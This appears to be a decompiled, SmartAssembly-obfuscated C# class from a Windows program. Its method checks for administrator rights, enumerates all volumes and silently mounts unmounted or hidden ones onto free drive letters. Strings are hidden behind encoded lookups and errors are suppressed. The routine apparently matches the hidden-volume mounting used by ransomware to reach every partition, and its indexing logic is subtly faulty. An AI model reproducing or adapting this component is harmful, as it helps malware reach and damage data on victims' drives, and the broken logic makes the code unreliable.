using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Security.Principal;
using System.Text;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace esImVhYKuzS;

public static class DcvDTlPAGW
{
	public enum fYPnuPhPnMJa : uint
	{
		JgIzCYYcEUPx,
		MFZtyKFuvMJRqQrLpO,
		nbxpmaqJYSrjn,
		oYlWuNFtGy,
		wTVESepDqRgZGRa,
		zDhBAaYalUbT,
		OwPEArZLbQ
	}

	private sealed class RIcdxgpvUvDtWBu
	{
		public uint gRaTGWHtccaf;

		public uint mFqtesYVvHM;

		public char[] GwttbdAwafdnEPM;

		public bool _003CMountVolumes_003Eb__0(string string_0)
		{
			if (GetVolumePathNamesForVolumeNameW(string_0, GwttbdAwafdnEPM, mFqtesYVvHM, ref gRaTGWHtccaf))
			{
				return GwttbdAwafdnEPM.Length != 3;
			}
			return true;
		}
	}

	[NonSerialized]
	internal static GetString getString_0;

	[DllImport("kernel32.dll")]
	public static extern fYPnuPhPnMJa GetDriveType([MarshalAs(UnmanagedType.LPStr)] string KcEDFxxGVaDjb);

	[DllImport("kernel32.dll", SetLastError = true)]
	[return: MarshalAs(UnmanagedType.Bool)]
	public static extern bool GetVolumePathNamesForVolumeNameW(string OZrjZCFWtdvvs, char[] HDjFrJdGAx, uint GOJyNaGwMapT, ref uint MODKbgOgYZQOjE);

	[DllImport("kernel32.dll")]
	internal static extern bool SetVolumeMountPoint(string string_0, string string_1);

	[DllImport("kernel32.dll", CallingConvention = CallingConvention.StdCall, SetLastError = true)]
	public static extern int FindFirstVolume(StringBuilder stringBuilder_0, int int_0);

	[DllImport("kernel32.dll", CallingConvention = CallingConvention.StdCall, SetLastError = true)]
	public static extern bool FindNextVolume(int int_0, StringBuilder stringBuilder_0, int int_1);

	public static List<string> cAHDsTJNNyLHXiT()
	{
		StringBuilder stringBuilder = new StringBuilder(1024);
		List<string> list = new List<string>();
		int int_ = FindFirstVolume(stringBuilder, 1024);
		do
		{
			list.Add(stringBuilder.ToString());
			Console.WriteLine(stringBuilder.ToString());
		}
		while (FindNextVolume(int_, stringBuilder, 1024));
		return list;
	}

	public static void AVDTwzmNmTrdT()
	{
		if (!new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
		{
			return;
		}
		try
		{
			RIcdxgpvUvDtWBu CS_0024_003C_003E8__locals0 = new RIcdxgpvUvDtWBu();
			string[] array = new string[26]
			{
				getString_0(107395918),
				getString_0(107395888),
				getString_0(107396010),
				getString_0(107395945),
				getString_0(107395935),
				getString_0(107395910),
				getString_0(107395898),
				getString_0(107395958),
				getString_0(107395928),
				getString_0(107395923),
				getString_0(107396030),
				getString_0(107395940),
				getString_0(107395983),
				getString_0(107396005),
				getString_0(107396000),
				getString_0(107395963),
				getString_0(107395953),
				getString_0(107395948),
				getString_0(107395975),
				getString_0(107395905),
				getString_0(107395915),
				getString_0(107395988),
				getString_0(107395893),
				getString_0(107395993),
				getString_0(107395965),
				getString_0(107395970)
			};
			string[] array2 = new string[array.Length];
			int num = 0;
			string[] array3 = array;
			foreach (string text in array3)
			{
				if (GetDriveType(text) == fYPnuPhPnMJa.MFZtyKFuvMJRqQrLpO)
				{
					array2[num++] = text;
				}
			}
			List<string> source = cAHDsTJNNyLHXiT();
			CS_0024_003C_003E8__locals0.gRaTGWHtccaf = 0u;
			CS_0024_003C_003E8__locals0.mFqtesYVvHM = 120u;
			CS_0024_003C_003E8__locals0.GwttbdAwafdnEPM = new char[260];
			foreach (string item in source.Where((string string_0) => !GetVolumePathNamesForVolumeNameW(string_0, CS_0024_003C_003E8__locals0.GwttbdAwafdnEPM, CS_0024_003C_003E8__locals0.mFqtesYVvHM, ref CS_0024_003C_003E8__locals0.gRaTGWHtccaf) || CS_0024_003C_003E8__locals0.GwttbdAwafdnEPM.Length != 3))
			{
				SetVolumeMountPoint(array2[num--], item);
				if (jIDJtYejSBzFCRw.pjFetgiEucLksJ)
				{
					try
					{
						Console.WriteLine(getString_0(107399112), array2[num--]);
					}
					catch (Exception)
					{
					}
				}
			}
		}
		catch (Exception ex2)
		{
			if (jIDJtYejSBzFCRw.yqFjfeWQNnFtS)
			{
				try
				{
					File.AppendAllText(jIDJtYejSBzFCRw.mldgFSRddxG, getString_0(107399055) + ex2.Message);
					return;
				}
				catch (Exception)
				{
					return;
				}
			}
		}
	}

	static DcvDTlPAGW()
	{
		Strings.CreateGetStringDelegate(typeof(DcvDTlPAGW));
	}
}
